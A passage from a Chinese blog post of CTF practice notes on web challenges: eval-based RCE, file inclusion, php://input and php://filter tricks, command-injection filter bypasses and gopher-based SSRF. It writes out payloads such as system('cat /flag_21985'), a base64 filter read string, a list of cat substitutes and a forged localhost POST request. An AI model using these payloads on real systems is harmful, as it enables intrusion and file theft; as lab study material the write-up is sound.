+<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230905162137980.png" alt="image-20230905162137980"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//查看上一级的目录</span><br><span class="line">cmd=system(&quot;ls /&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>发现flag文件</p>
+<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230905162352302.png" alt="image-20230905162352302"></p>
+<p>使用cat命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=system(&quot;cat /flag_21985&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>查看到flag的具体内容</p>
+<h3 id="2-文件包含"><a href="#2-文件包含" class="headerlink" title="2. 文件包含"></a>2. 文件包含</h3><p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230905164534416.png" alt="image-20230905164534416"></p>
+<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230905164602319.png" alt="image-20230905164602319"></p>
+<p>拿到题目，可以发现，我们在执行的时候可以将某个文件包含运行，这里明显要求将shell.txt的文件包含一起执行</p>
+<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230905164723651.png" alt="image-20230905164723651"></p>
+<p>成功执行代码</p>
+<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230905164802046.png" alt="image-20230905164802046"></p>
+<p>使用蚁剑连接，当然，使用system命令查看一个也是可以的，然后可以拿到flag</p>
+<h3 id="3-php-x2F-x2F-input"><a href="#3-php-x2F-x2F-input" class="headerlink" title="3. php:&#x2F;&#x2F;input"></a>3. php:&#x2F;&#x2F;input</h3><p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230912103927339.png" alt="image-20230912103927339"></p>
+<p>查看题目，可以发现题目没有给我们任何的有eval执行的shell文件了，但是，其留下了一个php:&#x2F;&#x2F;命令，可以使用php:&#x2F;&#x2F;input命令将我们想执行的代码传上去。</p>
+<p>php:&#x2F;&#x2F;input命令是一个php的命令输入流，其会将我们的代码以post的形式传到服务器，换句话说，php:&#x2F;&#x2F;input能接收我们写在post中的代码，并传输到服务器端。</p>
+<h3 id="4-源代码读取"><a href="#4-源代码读取" class="headerlink" title="4. 源代码读取"></a>4. 源代码读取</h3><p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230912111214367.png" alt="image-20230912111214367"></p>
+<p>fla在flag中，直接进行访问，使用php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;[文件名]即可。</p>
+<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230912112103953.png" alt="image-20230912112103953"></p>
+<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230912112120798-16955380701701.png" alt="image-20230912112120798"></p>
+<h3 id="5-远程包含"><a href="#5-远程包含" class="headerlink" title="5. 远程包含"></a>5. 远程包含</h3><p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230912112714652.png" alt="image-20230912112714652"></p>
+<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230912112742766.png" alt="image-20230912112742766"></p>
+<p>发现包含include，查看phpinfo，发现开启了allow_url_fopen和allow_url_include，也就是开启了远程包含</p>
+<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230912114803016.png" alt="image-20230912114803016"></p>
+<p>使用php:&#x2F;&#x2F;input将命令上传执行。</p>
+<h3 id="6-命令注入-无过滤"><a href="#6-命令注入-无过滤" class="headerlink" title="6. 命令注入-无过滤"></a>6. 命令注入-无过滤</h3><p>两个命令的分隔：</p>
+<p>1、每个命令之间用(分号)”;”隔开；<br>说明:各命令的执行结果，不会影响其他命令的。<br>意思是说每个命令都会执行，但不保证每个命令都执行成功。<br>2、每个命令之间用&amp;&amp;隔开<br>说明：若前面的命令执行成功，才会去执行后面的命令。这样的话，可以保证所有的命令执行完毕后，执行的过程都是成功的。<br>3、每个命令之间用||隔开<br>说明：||是或的意思，只有前面的命令执行失败后采取执行下一条命令，直到执行成功一条命令为止。<br>4、|是管道符号。管道符号改变标准输入的源或者是标准输出的目的地。<br>5、&amp;是后台任务符号。后台任务符号使shell在后台执行该任务，这样用户就可以立即得到一个提示符并继续其他工作。</p>
+<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913094235230.png" alt="image-20230913094235230"></p>
+<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913094431205.png" alt="image-20230913094431205"></p>
+<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913104311058.png" alt="image-20230913104311058"></p>
+<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913104359762.png" alt="image-20230913104359762"></p>
+<p>直接使用Linux的命令进行查看</p>
+<h3 id="7-命令注入-cat过滤"><a href="#7-命令注入-cat过滤" class="headerlink" title="7. 命令注入-cat过滤"></a>7. 命令注入-cat过滤</h3><p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913141710717.png" alt="image-20230913141710717"></p>
+<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913141928238.png" alt="image-20230913141928238"></p>
+<p>将cat命令过滤了，可以使用其他的查看命令</p>
+<p>当cat被过滤后,可以使用一下命令进行读取文件的内容<br>(1)more:一页一页的显示的显示档案内容<br>(2)less:与more类似,但是比more更好的是,他可以[pg dn][pg up]翻页<br>(3)head:查看头几行<br>(4)tac:从最后一行开始显示,可以看出tac是cat的反向显示<br>(5)tail:查看尾几行<br>(6)nl:显示的时候,顺便输出行号<br>(7)od:以二进制的方式读取档案内容<br>(8)vi:一种编辑器，这个也可以查看<br>(9)vim:一种编辑器,这个也可以查看<br>(10)sort:可以查看<br>(11)uniq:可以查看<br>(12)file -f:报错出具体的内容</p>
+<h3 id="8-命令注入-过滤空格"><a href="#8-命令注入-过滤空格" class="headerlink" title="8. 命令注入-过滤空格"></a>8. 命令注入-过滤空格</h3><p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913142247986.png" alt="image-20230913142247986"></p>
+<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913142601768.png" alt="image-20230913142601768"></p>
+<h3 id="9-命令注入-过滤目录分隔符"><a href="#9-命令注入-过滤目录分隔符" class="headerlink" title="9. 命令注入-过滤目录分隔符"></a>9. 命令注入-过滤目录分隔符</h3><p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913143918669.png" alt="image-20230913143918669"></p>
+<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913144015186.png" alt="image-20230913144015186"></p>
+<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913144137007.png" alt="image-20230913144137007"></p>
+<h3 id="10-命令注入-过滤运算符"><a href="#10-命令注入-过滤运算符" class="headerlink" title="10. 命令注入-过滤运算符"></a>10. 命令注入-过滤运算符</h3><p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913145850858.png" alt="image-20230913145850858"></p>
+<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913145952945.png" alt="image-20230913145952945"></p>
+<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913151042475.png" alt="image-20230913151042475"></p>
+<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913151535192.png" alt="image-20230913151535192"></p>
+<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913151718585.png" alt="image-20230913151718585"></p>
+<h1 id="6-SSRF"><a href="#6-SSRF" class="headerlink" title="6. SSRF"></a>6. SSRF</h1><h3 id="1-内网访问"><a href="#1-内网访问" class="headerlink" title="1. 内网访问"></a>1. 内网访问</h3><p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913201824609.png" alt="image-20230913201824609"></p>
+<h3 id="2-伪协议读取文件"><a href="#2-伪协议读取文件" class="headerlink" title="2. 伪协议读取文件"></a>2. 伪协议读取文件</h3><p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913204053560.png" alt="image-20230913204053560"></p>
+<h3 id="3-端口扫描"><a href="#3-端口扫描" class="headerlink" title="3. 端口扫描"></a>3. 端口扫描</h3><p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913205211049.png" alt="image-20230913205211049"></p>
+<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913205255854.png" alt="image-20230913205255854"></p>
+<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913205530535-16955381276002.png" alt="image-20230913205530535"></p>
+<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913205740556.png" alt="image-20230913205740556"></p>
+<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230913205803285.png" alt="image-20230913205803285"></p>
+<h3 id="4-POST请求"><a href="#4-POST请求" class="headerlink" title="4. POST请求"></a>4. POST请求</h3><p>写在题目前：</p>
+<p>302跳转的302是http状态码</p>
+<p>表示请求的网页自请求的网页移动到了新的位置，搜索引擎索引中保存原来的URL</p>
+<p>这里可以通过访问302.php，并且传参gopher来伪造本地访问</p>
+<p>Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。随着HTTP协议的壮大，Gopher协议已经慢慢的淡出了我们的视线，但是Gopher协议很多组件都支持并且可以做很多事，在SSRF中，Gopher协议</p>
+<p>可以对FTP、Telnet、Redis、Memcache、mysql进行攻击,也可以发送GET、POST 请求。</p>
+<p>那么Gopher协议需要如何构造妮？</p>
+<p>其实这个协议和http协议很类似，只不过gopher协议没有默认端口，需要特殊指定，而且需要指定POST方法，回车换行需要使用%0d%0a,而且POST参数之间的&amp;分隔符也需要URL编码</p>
+<p>我们来看看Gopher协议的基本协议格式</p>
+<p>gopher:&#x2F;&#x2F;:&#x2F;_后接TCP数据流</p>
+<p>这里直接写伪造的gopher协议</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/flag.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:80</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>36</span><br><span class="line"></span><br><span class="line"><span class="language-llvm">key<span class="operator">=</span>d<span class="number">93819</span><span class="keyword">c</span><span class="number">4</span><span class="keyword">c</span><span class="number">1</span>a<span class="number">18</span>dc<span class="number">606</span>dc<span class="number">5</span><span class="keyword">c</span><span class="number">6486</span>f<span class="number">77227</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230917104920370.png" alt="image-20230917104920370"></p>
+<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230917105031724.png" alt="image-20230917105031724"></p>
+<p>访问flag.php，会发现其给了一个上传框，并且给了一个key。</p>
+<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230917105323709.png" alt="image-20230917105323709"></p>
+<p>使用上传框传数据，但是却提示只能从本地访问。那我们可以使用gopher协议冒充本地访问</p>
+<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230917105537086.png" alt="image-20230917105537086"></p>
+<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230917105714104.png" alt="image-20230917105714104"></p>
+<p>使用gopher构造，具体结构如图，注意，Content-Length的长度应当与key的长度相同，否则不能访问。</p>
+<h3 id="5-文件上传"><a href="#5-文件上传" class="headerlink" title="5. 文件上传"></a>5. 文件上传</h3><p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230918134059991.png" alt="image-20230918134059991"><br><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230918134028668.png" alt="image-20230918134028668"></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+      
+        <div>
+
+<div style="text-align:center;color: #ccc;font-size:14px;">--------------本文结束<i class="fa fa-paw"></i>感谢您的阅读--------------</div>
+
+</div>
+
+      
+    </div>
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/10/13/css%E5%85%A5%E9%97%A8/" rel="prev" title="">
+      <i class="fa fa-chevron-left"></i> 
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/10/13/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/" rel="next" title="">
+       <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-web"><span class="nav-number">1.</span> <span class="nav-text">1. web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD"><span class="nav-number">1.1.</span> <span class="nav-text">1. 前置技能</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-http%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.1.1.</span> <span class="nav-text">1. http协议</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">1. 请求方式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-302%E8%B7%B3%E8%BD%AC"><span class="nav-number">1.1.1.2.</span> <span class="nav-text">2. 302跳转</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3"><span class="nav-number">1.1.1.3.</span> <span class="nav-text">3.</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="nav-number">2.</span> <span class="nav-text">2. 信息泄露</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="nav-number">2.1.</span> <span class="nav-text">1. 目录遍历</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-phpinfo"><span class="nav-number">2.2.</span> <span class="nav-text">2. phpinfo</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="nav-number">2.3.</span> <span class="nav-text">3. 备份文件下载</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81"><span class="nav-number">2.3.1.</span> <span class="nav-text">1. 网站源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-bak%E6%96%87%E4%BB%B6"><span class="nav-number">2.3.2.</span> <span class="nav-text">2. bak文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-vim%E7%BC%93%E5%AD%98"><span class="nav-number">2.3.3.</span> <span class="nav-text">3. vim缓存</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-DS-Store"><span class="nav-number">2.3.4.</span> <span class="nav-text">4. .DS_Store</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-git"><span class="nav-number">2.3.5.</span> <span class="nav-text">4. git</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-log"><span class="nav-number">2.3.5.1.</span> <span class="nav-text">1. log</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-svn%E6%B3%84%E9%9C%B2"><span class="nav-number">2.3.6.</span> <span class="nav-text">5. svn泄露</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-hg%E6%B3%84%E9%9C%B2"><span class="nav-number">2.3.7.</span> <span class="nav-text">6. hg泄露</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">2.4.</span> <span class="nav-text">3. SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%95%B4%E6%95%B0%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">2.4.1.</span> <span class="nav-text">1. 整数型注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">2.4.2.</span> <span class="nav-text">2. 字符型注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">2.4.3.</span> <span class="nav-text">3. 报错注入</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4-XSS"><span class="nav-number">3.</span> <span class="nav-text">4. XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%8F%8D%E5%B0%84%E5%9E%8B"><span class="nav-number">3.0.1.</span> <span class="nav-text">1. 反射型</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#5-RCE"><span class="nav-number">4.</span> <span class="nav-text">5. RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-eval%E6%89%A7%E8%A1%8C"><span class="nav-number">4.0.1.</span> <span class="nav-text">1. eval执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">4.0.2.</span> <span class="nav-text">2. 文件包含</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-php-x2F-x2F-input"><span class="nav-number">4.0.3.</span> <span class="nav-text">3. php:&#x2F;&#x2F;input</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E6%BA%90%E4%BB%A3%E7%A0%81%E8%AF%BB%E5%8F%96"><span class="nav-number">4.0.4.</span> <span class="nav-text">4. 源代码读取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB"><span class="nav-number">4.0.5.</span> <span class="nav-text">5. 远程包含</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-%E6%97%A0%E8%BF%87%E6%BB%A4"><span class="nav-number">4.0.6.</span> <span class="nav-text">6. 命令注入-无过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-cat%E8%BF%87%E6%BB%A4"><span class="nav-number">4.0.7.</span> <span class="nav-text">7. 命令注入-cat过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC"><span class="nav-number">4.0.8.</span> <span class="nav-text">8. 命令注入-过滤空格</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-%E8%BF%87%E6%BB%A4%E7%9B%AE%E5%BD%95%E5%88%86%E9%9A%94%E7%AC%A6"><span class="nav-number">4.0.9.</span> <span class="nav-text">9. 命令注入-过滤目录分隔符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#10-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-%E8%BF%87%E6%BB%A4%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="nav-number">4.0.10.</span> <span class="nav-text">10. 命令注入-过滤运算符</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#6-SSRF"><span class="nav-number">5.</span> <span class="nav-text">6. SSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%86%85%E7%BD%91%E8%AE%BF%E9%97%AE"><span class="nav-number">5.0.1.</span> <span class="nav-text">1. 内网访问</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="nav-number">5.0.2.</span> <span class="nav-text">2. 伪协议读取文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">5.0.3.</span> <span class="nav-text">3. 端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-POST%E8%AF%B7%E6%B1%82"><span class="nav-number">5.0.4.</span> <span class="nav-text">4. POST请求</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">5.0.5.</span> <span class="nav-text">5. 文件上传</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">yuanmouensis</p>
+  <div class="site-description" itemprop="description">here is yuanmouensis313's blog</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yuanmouensis</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
